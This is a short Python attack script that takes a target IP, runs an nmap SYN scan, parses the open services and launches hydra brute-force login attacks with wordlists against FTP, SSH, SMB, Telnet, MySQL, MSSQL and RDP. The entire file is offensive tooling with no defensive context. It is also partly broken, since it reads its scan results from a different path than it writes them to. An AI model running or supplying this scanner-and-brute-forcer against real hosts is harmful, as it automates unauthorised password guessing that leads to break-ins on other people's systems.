import os

import re

ip=input("Please input IP:")

servers=['ftp','ssh','smb','telnet','mysql','rdp','mssql']

def weak(ip):

    os.system('nmap -sS -v -n -T4 %s -oN /User/dell/Desktop/result.txt' % ip)

    with open('result.txt','r') as f:

        line=f.read().replace(' ','')

        pattern=re.compile(r'.*/tcpopen.*')

        keyword=pattern.findall(line)

        #print keyword

        hydra(keyword)

def hydra(keyword):

    for k in keyword:

        i=k.find('open')

        server=k[i+4:]

        if server in servers:

            print ("\033[1;31;40m===>hydra start brute %s====>\033[0m" % server)

            os.system('hydra -L user.txt -P pass.txt -t 4 %s://%s ' % (server,ip))

        if server=="ms-wbt-server":

            # print （"\033[1;31;40m===> hydra start brute rdp server ====>\033[0m"）
	
            os.system('hydra -L /User/dell/Desktop/user.txt -P /User/dell/Desktop/pass.txt -t 4 rdp://%s ' % ip)

        else:

            pass

if __name__ == '__main__':

	weak(ip)
